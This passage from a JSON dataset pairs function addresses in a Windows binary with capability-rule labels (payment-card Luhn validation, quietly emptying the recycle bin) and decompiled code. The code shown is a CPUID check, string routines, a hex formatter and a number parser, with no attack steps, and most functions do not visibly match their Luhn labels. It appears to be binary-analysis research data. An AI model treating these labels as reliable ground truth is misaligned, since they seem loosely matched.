        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180090986)\n// WARNING: Removing unreachable block (ram,0x000180090904)\n// WARNING: Removing unreachable block (ram,0x0001800908df)\n\nulong fcn.1800908b8(ulong noname_0, ulong arg2)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t in_XCR0;\n    \n    *0x180123094 = 2;\n    *0x180123090 = 1;\n    piVar1 = cpuid_basic_info(0);\n    uVar6 = 0;\n    puVar2 = cpuid_Version_info(1);\n    uVar4 = puVar2[3];\n    if ((piVar1[1] ^ 0x756e6547U | piVar1[3] ^ 0x6c65746eU | piVar1[2] ^ 0x49656e69U) == 0) {\n        *0x180123098 = 0xffffffffffffffff;\n        uVar5 = *puVar2 & 0xfff3ff0;\n        if ((((uVar5 == 0x106c0) || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n           ((uVar5 - 0x30650 < 0x21 && ((0x100010001U >> (uVar5 - 0x30650 & 0x3f) & 1) != 0)))) {\n            *0x180129104 = *0x180129104 | 1;\n        }\n    }\n    if (6 < *piVar1) {\n        iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n        uVar6 = *(iVar3 + 4);\n        if ((uVar6 >> 9 & 1) != 0) {\n            *0x180129104 = *0x180129104 | 2;\n        }\n    }\n    if ((uVar4 >> 0x14 & 1) != 0) {\n        *0x180123090 = 2;\n        *0x180123094 = 6;\n        if ((((uVar4 >> 0x1b & 1) != 0) && ((uVar4 >> 0x1c & 1) != 0)) && ((in_XCR0 & 6) == 6)) {\n            *0x180123094 = 0xe;\n            *0x180123090 = 3;\n            if ((uVar6 & 0x20) != 0) {\n                *0x180123090 = 5;\n                *0x180123094 = 0x2e;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 646
    },
    "1800054e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nvoid fcn.1800054e0(ulong noname_0, ulong arg2, ulong arg3, uint32_t *arg4)\n\n{\n    code *pcVar1;\n    ulong arg1;\n    uchar *arg1_00;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t *in_stack_00000028;\n    uchar auStack184 [32];\n    uchar *puStack152;\n    ulong uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    uchar auStack88 [40];\n    uchar uStack48;\n    unkbyte7 Stack47;\n    ulong uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack184;\n    fcn.180001dd0(&uStack48, *arg4);\n    arg1_00 = auStack88;\n    uStack144 = fcn.18000de50(arg1_00, in_stack_00000028);\n    puStack152 = &uStack48;\n    arg1 = fcn.180004b90(arg1_00, &uStack136, arg2, arg3);\n    fcn.1800679c0(arg1, 10);\n    if (0xf < uStack112) {\n        iVar3 = CONCAT71(Stack135, uStack136);\n        iVar2 = iVar3;\n        if ((0xfff < uStack112 + 1) && (iVar2 = *(iVar3 + -8),  0x1f < (iVar3 - iVar2) - 8U)) goto code_r0x000180005693;\n        fcn.18008fb24(iVar2);\n    }\n    uStack120 = *0x180101910;\n    uStack112 = *0x180101918;\n    uStack136 = 0;\n    if (uStack24 < 0x10) {\ncode_r0x0001800055fe:\n        uStack32 = *0x180101910;\n        uStack24 = *0x180101918;\n        uStack48 = 0;\n        if (in_stack_00000028[3] < 0x10) {\ncode_r0x00018000564d:\n            in_stack_00000028[2] = 0;\n            in_stack_00000028[3] = 0xf;\n            *in_stack_00000028 = 0;\n            fcn.18008fb00(uStack16 ^ auStack184);\n            return;\n        }\n        iVar2 = *in_stack_00000028;\n        iVar3 = iVar2;\n        if ((in_stack_00000028[3] + 1U < 0x1000) || (iVar3 = *(iVar2 + -8),  (iVar2 - iVar3) - 8U < 0x20)) {\n            fcn.18008fb24(iVar3);\n            goto code_r0x00018000564d;\n        }\n    }\n    else {\n        iVar3 = CONCAT71(Stack47, uStack48);\n        iVar2 = iVar3;\n        if (uStack24 + 1 < 0x1000) {\ncode_r0x0001800055f9:\n            fcn.18008fb24(iVar2);\n            goto code_r0x0001800055fe;\n        }\n        iVar2 = *(iVar3 + -8);\n        if ((iVar3 - iVar2) - 8U < 0x20) goto code_r0x0001800055f9;\n        fcn.1800b3528(*0x180101910, iVar2, uStack24 + 0x28);\n    }\n    fcn.1800b3528();\ncode_r0x000180005693:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 883
    },
    "1800056a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nvoid fcn.1800056a0(ulong noname_0, ulong arg2, ulong arg3, uint32_t *arg4)\n\n{\n    code *pcVar1;\n    ulong arg1;\n    uchar *arg1_00;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t *in_stack_00000028;\n    uchar auStack184 [32];\n    uchar *puStack152;\n    ulong uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    uchar auStack88 [40];\n    uchar uStack48;\n    unkbyte7 Stack47;\n    ulong uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack184;\n    fcn.180001dd0(&uStack48, *arg4);\n    arg1_00 = auStack88;\n    uStack144 = fcn.18000da90(arg1_00, in_stack_00000028);\n    puStack152 = &uStack48;\n    arg1 = fcn.180004d80(arg1_00, &uStack136, arg2, arg3);\n    fcn.1800679c0(arg1, 10);\n    if (0xf < uStack112) {\n        iVar3 = CONCAT71(Stack135, uStack136);\n        iVar2 = iVar3;\n        if ((0xfff < uStack112 + 1) && (iVar2 = *(iVar3 + -8),  0x1f < (iVar3 - iVar2) - 8U)) goto code_r0x000180005856;\n        fcn.18008fb24(iVar2);\n    }\n    uStack120 = *0x180101910;\n    uStack112 = *0x180101918;\n    uStack136 = 0;\n    if (uStack24 < 0x10) {\ncode_r0x0001800057be:\n        uStack32 = *0x180101910;\n        uStack24 = *0x180101918;\n        uStack48 = 0;\n        if (in_stack_00000028[3] < 8) {\ncode_r0x000180005812:\n            in_stack_00000028[2] = 0;\n            in_stack_00000028[3] = 7;\n            *in_stack_00000028 = 0;\n            fcn.18008fb00(uStack16 ^ auStack184);\n            return;\n        }\n        iVar2 = *in_stack_00000028;\n        iVar3 = iVar2;\n        if ((in_stack_00000028[3] * 2 + 2U < 0x1000) || (iVar3 = *(iVar2 + -8),  (iVar2 - iVar3) - 8U < 0x20)) {\n            fcn.18008fb24(iVar3);\n            goto code_r0x000180005812;\n        }\n    }\n    else {\n        iVar3 = CONCAT71(Stack47, uStack48);\n        iVar2 = iVar3;\n        if (uStack24 + 1 < 0x1000) {\ncode_r0x0001800057b9:\n            fcn.18008fb24(iVar2);\n            goto code_r0x0001800057be;\n        }\n        iVar2 = *(iVar3 + -8);\n        if ((iVar3 - iVar2) - 8U < 0x20) goto code_r0x0001800057b9;\n        fcn.1800b3528(*0x180101910, iVar2, uStack24 + 0x28);\n    }\n    fcn.1800b3528();\ncode_r0x000180005856:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 881
    },
    "180031c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nulong * fcn.180031c30(ulong *arg1, int64_t arg2, ulong *arg3, char *arg4)\n\n{\n    uchar uVar1;\n    uchar (*pauVar2) [16];\n    uchar *puVar3;\n    uint64_t uVar4;\n    uchar *puVar5;\n    uint64_t uVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    char cVar12;\n    char *in_stack_00000028;\n    \n    if (arg4 == in_stack_00000028) {\n        *arg1 = arg3;\n        return arg1;\n    }\n    do {\n        iVar11 = 0;\n        cVar12 = *arg4;\n        pcVar10 = arg4 + 1;\n        if (cVar12 == '&') {\n            pauVar2 = *(arg2 + 0x10);\n            iVar8 = *(arg2 + 0x18) - pauVar2;\n            iVar9 = iVar8 >> 0x3f;\n            if (iVar8 / 0x18 + iVar9 != iVar9) {\n                puVar3 = **pauVar2;\n                puVar5 = SUB168(*pauVar2 >> 0x40, 0);\n                iVar9 = puVar5 - puVar3;\n                if (puVar5 < puVar3) {\n                    iVar9 = iVar11;\n                }\n                puVar5 = puVar3;\n                if (iVar9 != 0) {\n                    do {\n                        uVar6 = arg3[2];\n                        uVar1 = *puVar5;\n                        if (uVar6 < arg3[3]) {\n                            arg3[2] = uVar6 + 1;\n                            puVar7 = arg3;\n                            if (0xf < arg3[3]) {\n                                puVar7 = *arg3;\n                            }\n                            *(puVar7 + uVar6) = uVar1;\n                            *(puVar7 + uVar6 + 1) = 0;\n                        }\n                        else {\n                            fcn.180013eb0(arg3, 1);\n                        }\n                        puVar5 = puVar5 + 1;\n                    } while (puVar5 - puVar3 != iVar9);\n                }\n            }\n        }\n        else {\n            if (cVar12 == '\\\\') {\n                if (pcVar10 == in_stack_00000028) break;\n                cVar12 = *pcVar10;\n                pcVar10 = arg4 + 2;\n                if (cVar12 - 0x30U < 10) {\n                    uVar6 = cVar12 - 0x30;\n                    iVar9 = *(arg2 + 0x10);\n                    if (uVar6 < (*(arg2 + 0x18) - iVar9) / 0x18) {\n                        uVar4 = *(iVar9 + uVar6 * 0x18);\n                        uVar6 = SUB168(*(iVar9 + uVar6 * 0x18) >> 0x40, 0);\n                        iVar9 = uVar6 - uVar4;\n                        if (uVar6 < uVar4) {\n                            iVar9 = iVar11;\n                        }\n                        if (iVar9 != 0) {\n                            do {\n                                uVar6 = arg3[2];\n                                uVar1 = *(iVar11 + uVar4);\n                                if (uVar6 < arg3[3]) {\n                                    arg3[2] = uVar6 + 1;\n                                    puVar7 = arg3;\n                                    if (0xf < arg3[3]) {\n                                        puVar7 = *arg3;\n                                    }\n                                    *(puVar7 + uVar6) = uVar1;\n                                    *(puVar7 + uVar6 + 1) = 0;\n                                }\n                                else {\n                                    fcn.180013eb0(arg3, 1);\n                                }\n                                iVar11 = iVar11 + 1;\n                            } while (iVar11 != iVar9);\n                        }\n                    }\n                    goto code_r0x000180031e48;\n                }\n            }\n            uVar6 = arg3[2];\n            if (uVar6 < arg3[3]) {\n                arg3[2] = uVar6 + 1;\n                puVar7 = arg3;\n                if (0xf < arg3[3]) {\n                    puVar7 = *arg3;\n                }\n                *(puVar7 + uVar6 + 1) = 0;\n                *(puVar7 + uVar6) = cVar12;\n            }\n            else {\n                fcn.180013eb0(arg3, 1);\n            }\n        }\ncode_r0x000180031e48:\n        arg4 = pcVar10;\n    } while (pcVar10 != in_stack_00000028);\n    *arg1 = arg3;\n    return arg1;\n}\n",
        "token_count": 1073
    },
    "180031ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nulong * fcn.180031ea0(ulong *arg1, int64_t arg2, ulong *arg3, char *arg4)\n\n{\n    uchar uVar1;\n    uchar (*pauVar2) [16];\n    uint64_t uVar3;\n    bool bVar4;\n    uchar *puVar5;\n    uint64_t uVar6;\n    ulong *puVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    uchar *puVar11;\n    char *pcVar12;\n    char cVar13;\n    int64_t iVar14;\n    char *in_stack_00000028;\n    \n    if (arg4 == in_stack_00000028) {\n        *arg1 = arg3;\n        return arg1;\n    }\n    iVar14 = 0;\n    do {\n        cVar13 = *arg4;\n        pcVar12 = arg4 + 1;\n        if (cVar13 == '$') {\n            if (pcVar12 == in_stack_00000028) {\n                uVar6 = arg3[2];\n                if (arg3[3] <= uVar6) goto code_r0x000180031f32;\n                arg3[2] = uVar6 + 1;\n                puVar7 = arg3;\n                if (0xf < arg3[3]) {\n                    puVar7 = *arg3;\n                }\n                *(puVar7 + uVar6) = 0x24;\n            }\n            else {\n                cVar13 = *pcVar12;\n                if (cVar13 == '$') {\n                    uVar6 = arg3[2];\n                    if (uVar6 < arg3[3]) {\n                        arg3[2] = uVar6 + 1;\n                        puVar7 = arg3;\n                        if (0xf < arg3[3]) {\n                            puVar7 = *arg3;\n                        }\n                        *(puVar7 + uVar6) = 0x24;\n                        pcVar12 = arg4 + 2;\n                    }\n                    else {\n                        fcn.180013eb0(arg3, 1);\n                        pcVar12 = arg4 + 2;\n                    }\n                }\n                else if (cVar13 == '`') {\n                    puVar11 = *(arg2 + 0x28);\n                    iVar10 = *(arg2 + 0x30) - puVar11;\n                    if (*(arg2 + 0x30) <= puVar11 && puVar11 != *(arg2 + 0x30)) {\n                        iVar10 = iVar14;\n                    }\n                    iVar9 = iVar14;\n                    if (iVar10 == 0) {\ncode_r0x0001800320ba:\n                        pcVar12 = arg4 + 2;\n                    }\n                    else {\n                        do {\n                            uVar6 = arg3[2];\n                            uVar1 = *puVar11;\n                            if (uVar6 < arg3[3]) {\n                                arg3[2] = uVar6 + 1;\n                                puVar7 = arg3;\n                                if (0xf < arg3[3]) {\n                                    puVar7 = *arg3;\n                                }\n                                *(puVar7 + uVar6) = uVar1;\n                                *(puVar7 + uVar6 + 1) = 0;\n                            }\n                            else {\n                                fcn.180013eb0(arg3, 1);\n                            }\n                            puVar11 = puVar11 + 1;\n                            iVar9 = iVar9 + 1;\n                        } while (iVar9 != iVar10);\n                        pcVar12 = arg4 + 2;\n                    }\n                }\n                else {\n                    if (cVar13 == '\\'') {\n                        puVar11 = *(arg2 + 0x40);\n                        iVar10 = *(arg2 + 0x48) - puVar11;\n                        if (*(arg2 + 0x48) <= puVar11 && puVar11 != *(arg2 + 0x48)) {\n                            iVar10 = iVar14;\n                        }\n                        iVar9 = iVar14;\n                        if (iVar10 != 0) {\n                            do {\n                                uVar6 = arg3[2];\n                                uVar1 = *puVar11;\n                                if (uVar6 < arg3[3]) {\n                                    arg3[2] = uVar6 + 1;\n                                    puVar7 = arg3;\n                                    if (0xf < arg3[3]) {\n                                        puVar7 = *arg3;\n                                    }\n                                    *(puVar7 + uVar6) = uVar1;\n                                    *(puVar7 + uVar6 + 1) = 0;\n                                }\n                                else {\n                                    fcn.180013eb0(arg3, 1);\n                                }\n                                puVar11 = puVar11 + 1;\n                                iVar9 = iVar9 + 1;\n                            } while (iVar9 != iVar10);\n                        }\n                        goto code_r0x0001800320ba;\n                    }\n                    if (cVar13 == '&') {\n                        pauVar2 = *(arg2 + 0x10);\n                        pcVar12 = arg4 + 2;\n                        iVar9 = *(arg2 + 0x18) - pauVar2;\n                        iVar10 = iVar9 >> 0x3f;\n                        if (iVar9 / 0x18 + iVar10 != iVar10) {\n                            puVar11 = **pauVar2;\n                            puVar5 = SUB168(*pauVar2 >> 0x40, 0);\n                            iVar10 = puVar5 - puVar11;\n                            if (puVar5 < puVar11) {\n                                iVar10 = iVar14;\n                            }\n                            puVar5 = puVar11;\n                            if (iVar10 != 0) {\n                                do {\n                                    uVar6 = arg3[2];\n                                    uVar1 = *puVar5;\n                                    if (uVar6 < arg3[3]) {\n                                        arg3[2] = uVar6 + 1;\n                                        puVar7 = arg3;\n                                        if (0xf < arg3[3]) {\n                                            puVar7 = *arg3;\n                                        }\n                                        *(puVar7 + uVar6) = uVar1;\n                                        *(puVar7 + uVar6 + 1) = 0;\n                                    }\n                                    else {\n                                        fcn.180013eb0(arg3, 1);\n                                    }\n                                    puVar5 = puVar5 + 1;\n                                } while (puVar5 - puVar11 != iVar10);\n                            }\n                        }\n                    }\n                    else {\n                        if (9 < cVar13 - 0x30U) {\n                            uVar6 = arg3[2];\n                            if (uVar6 < arg3[3]) {\n                                arg3[2] = uVar6 + 1;\n                                puVar7 = arg3;\n                                if (0xf < arg3[3]) {\n                                    puVar7 = *arg3;\n                                }\n                                *(puVar7 + uVar6) = 0x24;\n                            }\n                            else {\n                                fcn.180013eb0(arg3, 1);\n                            }\n                            cVar13 = *pcVar12;\n                            pcVar12 = arg4 + 2;\n                            goto code_r0x00018003234f;\n                        }\n                        pcVar12 = arg4 + 2;\n                        uVar8 = cVar13 - 0x30;\n                        if ((pcVar12 == in_stack_00000028) || (cVar13 = *pcVar12,  9 < cVar13 - 0x30U)) {\n                            bVar4 = false;\n                        }\n                        else {\n                            bVar4 = true;\n                            pcVar12 = arg4 + 3;\n                            uVar8 = cVar13 + (uVar8 * 5 + -0x18) * 2;\n                        }\n                        if (uVar8 == 0) {\n                            uVar6 = arg3[2];\n                            if (uVar6 < arg3[3]) {\n                                arg3[2] = uVar6 + 1;\n                                puVar7 = arg3;\n                                if (0xf < arg3[3]) {\n                                    puVar7 = *arg3;\n                                }\n                                *(puVar7 + uVar6) = 0x24;\n                            }\n                            else {\n                                fcn.180013eb0(arg3, 1);\n                            }\n                            uVar6 = arg3[2];\n                            if (uVar6 < arg3[3]) {\n                                arg3[2] = uVar6 + 1;\n                                puVar7 = arg3;\n                                if (0xf < arg3[3]) {\n                                    puVar7 = *arg3;\n                                }\n                                *(puVar7 + uVar6) = 0x30;\n                            }\n                            else {\n                                fcn.180013eb0(arg3, 1);\n                            }\n                            if (bVar4) {\n                                uVar6 = arg3[2];\n                                if (arg3[3] <= uVar6) goto code_r0x000180031f32;\n                                arg3[2] = uVar6 + 1;\n                                puVar7 = arg3;\n                                if (0xf < arg3[3]) {\n                                    puVar7 = *arg3;\n                                }\n                                *(puVar7 + uVar6) = 0x30;\n                            }\n                        }\n                        else {\n                            iVar10 = *(arg2 + 0x10);\n                            uVar6 = uVar8;\n                            if (uVar6 < (*(arg2 + 0x18) - iVar10) / 0x18) {\n                                uVar3 = *(iVar10 + uVar6 * 0x18);\n                                uVar6 = SUB168(*(iVar10 + uVar6 * 0x18) >> 0x40, 0);\n                                iVar10 = uVar6 - uVar3;\n                                if (uVar6 < uVar3) {\n                                    iVar10 = iVar14;\n                                }\n                                iVar9 = iVar14;\n                                if (iVar10 != 0) {\n                                    do {\n                                        uVar6 = arg3[2];\n                                        uVar1 = *(iVar9 + uVar3);\n                                        if (uVar6 < arg3[3]) {\n                                            arg3[2] = uVar6 + 1;\n                                            puVar7 = arg3;\n                                            if (0xf < arg3[3]) {\n                                                puVar7 = *arg3;\n                                            }\n                                            *(puVar7 + uVar6) = uVar1;\n                                            *(puVar7 + uVar6 + 1) = 0;\n                                        }\n                                        else {\n                                            fcn.180013eb0(arg3, 1);\n                                        }\n                                        iVar9 = iVar9 + 1;\n                                    } while (iVar9 != iVar10);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        else {\ncode_r0x00018003234f:\n            uVar6 = arg3[2];\n            if (uVar6 < arg3[3]) {\n                arg3[2] = uVar6 + 1;\n                puVar7 = arg3;\n                if (0xf < arg3[3]) {\n                    puVar7 = *arg3;\n                }\n                *(puVar7 + uVar6 + 1) = 0;\n                *(puVar7 + uVar6) = cVar13;\n            }\n            else {\ncode_r0x000180031f32:\n                fcn.180013eb0(arg3, 1);\n            }\n        }\n        arg4 = pcVar12;\n        if (pcVar12 == in_stack_00000028) {\n            *arg1 = arg3;\n            return arg1;\n        }\n    } while( true );\n}\n",
        "token_count": 2524
    },
    "180065dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nvoid fcn.180065dc0(ulong arg1, ulong *arg2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    uint uStack72;\n    ulong uStack64;\n    ulong *puStack56;\n    uint8_t auStack48 [16];\n    uint64_t uStack32;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack104;\n    iVar5 = 0;\n    uStack72 = 0;\n    puStack56 = arg2;\n    fcn.180065f00(arg1, auStack48);\n    arg2[2] = 0;\n    arg2[3] = 0xf;\n    *arg2 = 0;\n    uStack72 = 1;\n    if (arg2[3] < 0x20) {\n        fcn.1800137f0(arg2, 0x20);\n        arg2[2] = 0;\n    }\n    do {\n        uVar1 = auStack48[iVar5];\n        cVar2 = \"0123456789abcdef\"[uVar1 >> 4];\n        uVar3 = arg2[2];\n        if (uVar3 < arg2[3]) {\n            arg2[2] = uVar3 + 1;\n            puVar4 = arg2;\n            if (0xf < arg2[3]) {\n                puVar4 = *arg2;\n            }\n            *(puVar4 + uVar3) = cVar2;\n            *(puVar4 + uVar3 + 1) = 0;\n        }\n        else {\n            fcn.180013eb0(arg2, 1);\n        }\n        cVar2 = \"0123456789abcdef\"[uVar1 & 0xf];\n        uVar3 = arg2[2];\n        if (uVar3 < arg2[3]) {\n            arg2[2] = uVar3 + 1;\n            puVar4 = arg2;\n            if (0xf < arg2[3]) {\n                puVar4 = *arg2;\n            }\n            *(puVar4 + uVar3) = cVar2;\n            *(puVar4 + uVar3 + 1) = 0;\n        }\n        else {\n            fcn.180013eb0(arg2, 1);\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x10);\n    fcn.18008fb00(uStack32 ^ auStack104);\n    return;\n}\n",
        "token_count": 585
    },
    "18007484": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nvoid fcn.18007484c(code **arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t arg1_00;\n    uchar auStack104 [32];\n    code **ppcStack72;\n    ulong uStack64;\n    ulong uStack56;\n    uchar uStack48;\n    unkbyte7 Stack47;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack104;\n    uStack32 = *0x180101910;\n    uStack28 = *0x180101914;\n    uStack24 = *0x180101918;\n    uStack20 = *0x18010191c;\n    uStack48 = 0;\n    ppcStack72 = arg1;\n    fcn.180011100(&uStack48, arg4);\n    ppcStack72 = ppcStack72 & 0xffffffff00000000 | arg2;\n    uStack64 = arg3;\n    fcn.180001f90(arg1, &ppcStack72, &uStack48);\n    uVar3 = CONCAT44(uStack20, uStack24);\n    if (0xf < uVar3) {\n        iVar2 = CONCAT71(Stack47, uStack48);\n        arg1_00 = iVar2;\n        if (0xfff < uVar3 + 1) {\n            arg1_00 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, uVar3 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg1 = vtable.std::system_error.0;\n    fcn.18008fb00(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 484
    },
    "18007d45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.18007d454(ulong noname_0, ulong arg2, ulong arg3, ulong arg4, ulong noname_4, int32_t *noname_5, \n                  int64_t *noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong arg_60h, ulong arg_68h, \n                  ulong arg_70h)\n\n{\n    bool bVar1;\n    char cVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uchar auStack152 [32];\n    int32_t aiStack120 [2];\n    char *pcStack112;\n    char cStack104;\n    char acStack103 [30];\n    char cStack73;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_10h;\n    \n    var_40h = *0x180123080 ^ auStack152;\n    pcVar5 = &cStack104;\n    cVar2 = fcn.1800890e8(arg2, arg3);\n    if (cVar2 == '\\0') {\n        uVar3 = fcn.1800783e4(arg2);\n        cVar2 = (**0x1800de8f0)(noname_6, uVar3, 0, *(*noname_6 + 0x70));\n        if ((cVar2 == '+') || (cVar2 == '-')) {\n            pcVar5 = acStack103;\n            cStack104 = cVar2;\n            fcn.18007f190(arg2);\n        }\n    }\n    bVar1 = false;\n    cVar2 = fcn.1800890e8(arg2, arg3);\n    if (cVar2 == '\\0') {\n        do {\n            uVar3 = fcn.1800783e4(arg2);\n            cVar2 = (**0x1800de8f0)(noname_6, uVar3, 0, *(*noname_6 + 0x70));\n            if (cVar2 != '0') break;\n            bVar1 = true;\n            fcn.18007f190(arg2);\n            cVar2 = fcn.1800890e8(arg2, arg3);\n        } while (cVar2 == '\\0');\n        if (bVar1) {\n            *pcVar5 = '0';\n            pcVar5 = pcVar5 + 1;\n        }\n    }\n    while (pcVar6 = pcVar5,  cVar2 = fcn.1800890e8(arg2, arg3),  cVar2 == '\\0') {\n        uVar3 = fcn.1800783e4(arg2);\n        cVar2 = (**0x1800de8f0)(noname_6, uVar3, 0, *(*noname_6 + 0x70));\n        if (9 < cVar2 - 0x30U) break;\n        *pcVar6 = cVar2;\n        bVar1 = true;\n        fcn.18007f190(arg2);\n        pcVar5 = pcVar6 + 1;\n        if (&cStack73 <= pcVar6) {\n            pcVar5 = pcVar6;\n        }\n    }\n    aiStack120[0] = 0;\n    pcVar5 = &cStack104;\n    if (bVar1) {\n        pcVar5 = pcVar6;\n    }\n    *pcVar5 = '\\0';\n    iVar4 = fcn.18008ea8c(&cStack104, &pcStack112, 10, aiStack120);\n    fcn.1800890e8(arg2, arg3);\n    if ((((pcStack112 != &cStack104) && (aiStack120[0] == 0)) && (arg4 <= iVar4)) && (iVar4 <= noname_4)) {\n        *noname_5 = iVar4;\n    }\n    fcn.18008fb00(var_40h ^ auStack152);\n    return;\n}\n",
        "token_count": 933
    },
    "18003d2b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.18003d2b0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char cVar5;\n    int64_t arg1_00;\n    ulong arg1_01;\n    ulong ****ppppuVar6;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uchar auStack376 [32];\n    int64_t *piStack344;\n    int64_t iStack328;\n    uint uStack320;\n    uint uStack316;\n    uint64_t uStack312;\n    uint64_t uStack304;\n    ulong ****appppuStack288 [3];\n    uint64_t uStack264;\n    ulong uStack256;\n    uchar auStack248 [128];\n    ushort uStack120;\n    unkbyte6 Stack118;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong ****appppuStack88 [2];\n    int64_t iStack72;\n    uint64_t uStack64;\n    uint64_t uStack56;\n    \n    uStack256 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack376;\n    uStack104 = *0x180101900;\n    uStack100 = *0x180101904;\n    uStack96 = *0x180101908;\n    uStack92 = *0x18010190c;\n    uStack120 = 0;\n    arg1_00 = arg1;\n    piStack344 = &uStack120;\n    cVar5 = fcn.18000af20(arg1, *(arg1 + 0x18));\n    uVar4 = CONCAT44(uStack92, uStack96);\n    piVar2 = CONCAT62(Stack118, uStack120);\n    if (cVar5 != '\\0') {\n        uStack312 = 0;\n        uStack304 = 0;\n        piVar7 = &uStack120;\n        if (7 < uVar4) {\n            piVar7 = piVar2;\n        }\n        uVar8 = 7;\n        uVar3 = CONCAT44(uStack100, uStack104);\n        if (uVar3 < 8) {\n            iStack328 = *piVar7;\n            uStack320 = *(piVar7 + 1);\n            uStack316 = *(piVar7 + 0xc);\n            uVar9 = 7;\n        }\n        else {\n            uVar9 = uVar3 | 7;\n            if (0x7ffffffffffffffe < uVar9) {\n                uVar9 = 0x7ffffffffffffffe;\n            }\n            arg1_00 = fcn.180011cf0(&iStack328, uVar9 + 1);\n            iStack328 = arg1_00;\n            fcn.1800ade80(arg1_00, piVar7, uVar3 * 2 + 2);\n        }\n        uStack312 = uVar3;\n        uStack304 = uVar9;\n        cVar5 = fcn.18000c270(arg1_00, &iStack328);\n        if (cVar5 == '\\0') goto code_r0x00018003d504;\n        uStack312 = 0;\n        uStack304 = 0;\n        piVar7 = &uStack120;\n        if (7 < uVar4) {\n            piVar7 = piVar2;\n        }\n        if (uVar3 < 8) {\n            iStack328 = *piVar7;\n            uStack320 = *(piVar7 + 1);\n            uStack316 = *(piVar7 + 0xc);\n        }\n        else {\n            uVar8 = uVar3 | 7;\n            if (0x7ffffffffffffffe < uVar8) {\n                uVar8 = 0x7ffffffffffffffe;\n            }\n            arg1_00 = fcn.180011cf0(&iStack328, uVar8 + 1);\n            iStack328 = arg1_00;\n            fcn.1800ade80(arg1_00, piVar7, uVar3 * 2 + 2);\n        }\n        uStack312 = uVar3;\n        uStack304 = uVar8;\n        